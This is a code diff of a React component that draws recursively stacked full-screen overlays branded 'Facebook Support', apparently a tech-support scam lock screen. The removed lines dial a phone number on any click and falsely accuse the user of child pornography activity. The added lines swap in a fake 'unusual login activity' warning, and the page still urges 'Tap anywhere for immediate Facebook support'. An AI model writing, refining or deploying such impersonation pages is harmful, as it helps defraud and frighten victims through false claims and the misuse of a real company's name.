@@ -854,7 +854,7 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
           transform: `scale(${1 - depth * 0.05})`,
           zIndex: 1000 + depth
         }}
-        onClick={() => (window.location.href = "tel:18445131621")}
+       
       >
         {/* <ToastContainer position="top-right" autoClose={5000} /> */}
         <ToastContainer
@@ -878,7 +878,7 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
               <h2 className="text-2xl font-semibold text-center">Facebook Support</h2>
               <p className="text-base md:text-lg text-muted-foreground"><br></br>
            <h1 className="text-xl md:text-3xl font-semibold tracking-tight">Warning:</h1> <br></br>
-           Your phone has been locked for a child pornography activity. Access has been restricted. Contact support Immediately at below number.
+           We've Detected Unusual Login Activity on Your Facebook Account.Your account may have been accessed from an unknown device or location. For your safety, we recommend reviewing the login now.
             <br /><br />
           </p>
               <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Facebook support</p>
